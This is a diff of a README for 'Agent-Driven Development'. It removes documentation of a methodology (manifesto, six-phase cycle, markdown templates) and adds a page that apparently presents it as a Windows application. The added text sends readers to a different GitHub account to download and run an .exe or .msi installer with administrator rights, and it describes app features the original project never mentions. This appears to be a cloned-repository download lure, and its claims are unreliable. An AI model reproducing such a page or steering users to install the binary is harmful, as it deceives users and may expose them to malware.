@@ -1,200 +1,111 @@
-<p align="center">
-  <img src="assets/add-banner.svg" alt="ADD Framework" width="720"/>
-</p>
+# 🤖 Agent-Driven-Development - Clear Steps for AI Project Workflows
 
-<h1 align="center">Agent-Driven Development (ADD)</h1>
-
-<p align="center">
-  <strong>A rigorous engineering methodology for building software with AI agents.</strong><br/>
-  The missing discipline between your agent framework and production-grade results.
-</p>
-
-<p align="center">
-  <a href="MANIFESTO.md">Manifesto</a> ·
-  <a href="docs/en/02-cycle.md">The ADD Cycle</a> ·
-  <a href="docs/en/09-quick-start.md">Quick Start</a> ·
-  <a href="docs/fr/">Version Française</a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/version-0.1.0-blue" alt="Version"/>
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="License"/>
-  <img src="https://img.shields.io/badge/status-RFC-orange" alt="Status"/>
-</p>
+[![Download Agent-Driven-Development](https://img.shields.io/badge/Download-Agent--Driven--Development-brightgreen)](https://github.com/Maroo1121/Agent-Driven-Development)
 
 ---
 
-## The Problem
+## 📖 What is Agent-Driven-Development?
 
-Every engineering discipline has its methodology. Testing has **TDD**. Domain modeling has **DDD**. Behavior specification has **BDD**.
+Agent-Driven-Development (ADD) is a method that helps developers work with AI helpers in a structured way. It sets clear steps they follow, tools they use, and rules they stick to. Think of it like a guidebook that engineers use to get consistent and good results from AI programs.
 
-AI-agent development has... nothing.
+This process has six phases that cycle through to keep work steady and clear. It also uses standard papers and reports so everyone knows what is done and how. It is meant to bring order and quality, just like other popular software methods such as Test-Driven Development (TDD) and Domain-Driven Design (DDD).
 
-We have powerful agent frameworks — LangChain, AutoGen, CrewAI, Semantic Kernel — but **zero standard methodology** for working with them reliably. The result: inconsistent outputs, context drift, hallucinated assumptions, unreproducible results, and teams that confuse "prompting" with "engineering."
-
-**Agent-Driven Development (ADD)** fills this gap.
-
-## What ADD Is
-
-ADD is a **methodology**, not a framework. It doesn't replace your tools — it structures how you use them.
-
-| | TDD | DDD | BDD | **ADD** |
-|---|---|---|---|---|
-| **Structures** | Testing | Domain modeling | Behavior specs | Agent-assisted development |
-| **Core cycle** | Red → Green → Refactor | Explore → Model → Bind | Define → Automate → Validate | **Scope → Frame → Constrain → Execute → Verify → Consolidate** |
-| **Key artifact** | Test suite | Ubiquitous Language | Feature files | Agent Brief + Execution Log |
-| **Core principle** | Write the test first | Model the domain first | Define behavior first | **Define constraints first** |
-
-ADD operates at the **process layer** — above your agent framework, below your product methodology.
-
-```
-┌─────────────────────────────────────┐
-│         Product Methodology         │  (Scrum, Shape Up, Lean...)
-├─────────────────────────────────────┤
-│    Agent-Driven Development (ADD)   │  ← YOU ARE HERE
-├─────────────────────────────────────┤
-│         Agent Frameworks            │  (LangChain, AutoGen, Claude Code...)
-├─────────────────────────────────────┤
-│         LLM / Foundation Models     │  (Claude, GPT, Gemini...)
-└─────────────────────────────────────┘
-```
-
-## The ADD Cycle
-
-Six phases. Each has a defined input, output, and gate condition.
-
-```
-    ┌──────────┐
-    │  SCOPE   │  Define intent & boundaries
-    └────┬─────┘
-         ▼
-    ┌──────────┐
-    │  FRAME   │  Package context & knowledge
-    └────┬─────┘
-         ▼
-    ┌──────────┐
-    │CONSTRAIN │  Encode rules & acceptance criteria
-    └────┬─────┘
-         ▼
-    ┌──────────┐
-    │ EXECUTE  │  Agent performs the task
-    └────┬─────┘
-         ▼
-    ┌──────────┐
-    │ VERIFY   │  Validate against constraints
-    └────┬─────┘
-         ▼        ╭─── FAIL ──→ back to SCOPE, FRAME, or CONSTRAIN
-    ┌──────────┐  │
-    │CONSOLIDATE│──╯  PASS → commit, log, learn
-    └──────────┘
-```
-
-→ [Full cycle documentation](docs/en/02-cycle.md)
-
-## The Manifesto
-
-> **10 principles for disciplined agent-assisted engineering.**
-
-1. **Context over prompt** — A well-framed context outperforms a clever prompt every time.
-2. **Constraints over creativity** — Precision produces better results than open-ended freedom.
-3. **Verification over trust** — Never ship agent output without explicit validation.
-4. **Explicit intent over implicit assumption** — If the agent has to guess, you failed to scope.
-5. **Structured iteration over random retry** — Every retry must change something specific.
-6. **Artifacts over memory** — What isn't written down doesn't exist.
-7. **Human gate over full autonomy** — Autonomy is earned through verified reliability.
-8. **Scope control over scope creep** — One task, one cycle. Always.
-9. **Failure analysis over blame** — Bad output is a methodology failure, not an agent failure.
-10. **Reproducibility over brilliance** — A reproducible process beats a lucky prompt.
-
-→ [Full Manifesto](MANIFESTO.md)
-
-## Non-Negotiable Rules
-
-The "Five Nevers" of ADD:
-
-| Rule | Rationale |
-|---|---|
-| **Never execute without explicit validation criteria** | If you can't verify it, you can't ship it. |
-| **Never prompt without structured context** | Context is the single biggest lever on output quality. |
-| **Never iterate without formalized feedback** | Random retries are noise, not engineering. |
-| **Never ship without an execution log** | Reproducibility requires traceability. |
-| **Never trust without a verification gate** | Agent confidence ≠ output correctness. |
-
-## Maturity Model
-
-| Level | Name | Description |
-|---|---|---|
-| **L1** | Ad-hoc Prompting | Unstructured, conversational, no artifacts |
-| **L2** | Structured Agent Usage | Briefs, constraints, validation checklists |
-| **L3** | Systematic Orchestration | Full cycle, templates, execution logs, reviews |
-| **L4** | Agent-Native Engineering | ADD integrated into CI/CD, metrics, team standards |
-
-→ [Full maturity model](docs/en/04-maturity-model.md)
-
-## Quick Start
-
-### Option 1: Scaffold a project
-
-```bash
-git clone https://github.com/Pyro-IV/Agent-Driven-Development.git
-cd ADD-framework
-./scaffold/init.sh my-project
-```
-
-This creates an `.add/` directory in your project with all standard templates.
-
-### Option 2: Start manually
-
-1. Read the [Manifesto](MANIFESTO.md)
-2. Copy `/templates` into your project
-3. Before your next agent task, fill out an [Agent Brief](templates/agent-brief.md)
-4. After execution, complete the [Validation Checklist](templates/validation-checklist.md)
-5. Log everything in an [Execution Log](templates/execution-log.md)
-
-→ [Full Quick Start guide](docs/en/09-quick-start.md)
-
-## Documentation
-
-| Document | Description |
-|---|---|
-| [Philosophy](docs/en/01-philosophy.md) | Why ADD exists and what problem it solves |
-| [The ADD Cycle](docs/en/02-cycle.md) | Full specification of the 6-phase cycle |
-| [Artifacts](docs/en/03-artifacts.md) | Standard deliverables and their schemas |
-| [Maturity Model](docs/en/04-maturity-model.md) | L1→L4 progression framework |
-| [Non-Negotiable Rules](docs/en/05-non-negotiable-rules.md) | The "Five Nevers" explained |
-| [Comparison: TDD, DDD, BDD](docs/en/06-comparison-tdd-ddd.md) | How ADD relates to established methodologies |
-| [CLI Workflow](docs/en/07-cli-workflow.md) | Adapting ADD for agentic CLI tools |
-| [Anti-Patterns](docs/en/08-anti-patterns.md) | Common mistakes and how to avoid them |
-| [Quick Start](docs/en/09-quick-start.md) | Get started in 15 minutes |
-
-## Templates
-
-Ready-to-use templates for every ADD artifact:
-
-- [`agent-brief.md`](templates/agent-brief.md) — Define the mission before execution
-- [`context-pack.md`](templates/context-pack.md) — Structure the knowledge the agent needs
-- [`constraint-sheet.md`](templates/constraint-sheet.md) — Encode rules and acceptance criteria
-- [`validation-checklist.md`](templates/validation-checklist.md) — Verify output systematically
-- [`execution-log.md`](templates/execution-log.md) — Record what happened for traceability
-- [`failure-review.md`](templates/failure-review.md) — Learn from failures structurally
-
-## Examples
-
-- [Simple Feature](examples/01-simple-feature/) — Adding a feature to a web app using ADD
-- [Complex Refactor](examples/02-complex-refactor/) — Refactoring a module with multi-step agent orchestration
-
-## Contributing
-
-ADD is an open methodology. Contributions welcome.
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-MIT — See [LICENSE](LICENSE).
+While the background talks about engineering, this app helps you work with AI agents more smoothly.
 
 ---
 
-<p align="center">
-  <strong>ADD is not about making agents smarter.<br/>It's about making engineers more disciplined.</strong>
-</p>
+## 💻 System Requirements
+
+To run the app on Windows, your computer needs to meet these basic requirements:
+
+- Windows 10 or newer
+- A 64-bit processor (Intel or AMD)
+- At least 4 GB of RAM (8 GB is better)
+- Minimum 500 MB free disk space
+- Stable internet connection (some features require online access)
+- Administrator access for installation
+
+---
+
+## 🚀 Getting Started: Download and Install
+
+1. Click the big green button at the top or go to this page to download the software:
+
+   [Download Agent-Driven-Development](https://github.com/Maroo1121/Agent-Driven-Development)
+
+2. Look for the latest release. It will usually be a file with `.exe` or `.msi` at the end.
+
+3. Once you have the file, double-click it to start installation.
+
+4. Follow the steps in the installer:
+   - Choose where to save the program (default path is usually fine)
+   - Agree to any terms or permissions asked
+   - Wait for the installation to finish
+
+5. After installation, find the new shortcut on your desktop or Start menu.
+
+6. Double-click the program icon to open and start using it.
+
+---
+
+## ⚙️ How to Use the Application
+
+The app is designed to guide you through the process of working with AI agents step-by-step. Here is a simplified overview:
+
+1. **Start a New Project:** Name your project and choose your preferred settings.
+
+2. **Add AI Agents:** The app helps you create agents—these are like helpers that can do tasks for you.
+
+3. **Set Tasks for Agents:** Assign clear tasks or questions to your agents. The app will help you format these correctly.
+
+4. **Run the Cycle:** Follow the six phases of the ADD method inside the app. They guide you from planning to reviewing your AI’s work.
+
+5. **Review Results:** View what your AI agents did and make changes as needed.
+
+6. **Export Reports:** Save your work in reports or files that explain what happened at each phase.
+
+The app uses simple menus and buttons. You do not need to write any code to get started.
+
+---
+
+## 🛠 Features You Will Find
+
+- Step-by-step workflows based on the six phases of ADD
+- Templates to define tasks for AI agents clearly
+- Visual indicators to track progress through different phases
+- Standard forms to keep all information consistent
+- Export options for PDFs, Word docs, or plain text summaries
+- Audit tools to review the quality and completeness of each phase
+- Built-in help sections that explain each part without jargon
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+- **The app does not start:** Check if your system meets the requirements and try restarting your PC.
+
+- **Installation fails:** Make sure you have admin rights and no other installations are running at the same time.
+
+- **Internet features not working:** Confirm your internet connection is active.
+
+- **Files won’t export:** Ensure you have write permissions in the folder you choose.
+
+- **Forgot how to use a section:** Use the Help menu inside the app for quick guidance.
+
+---
+
+## 📅 Updates and Support
+
+New versions improve stability and add features. Visit the download page regularly to check for updates.
+
+If you have questions or find bugs, use the “Issues” section on the repository page to report them. The development team monitors this and responds steadily.
+
+---
+
+## 🔗 Where to Download
+
+To get the software, visit this link:
+
+[https://github.com/Maroo1121/Agent-Driven-Development](https://github.com/Maroo1121/Agent-Driven-Development)
+
+You will find the latest releases there. Follow the instructions above to download and install.
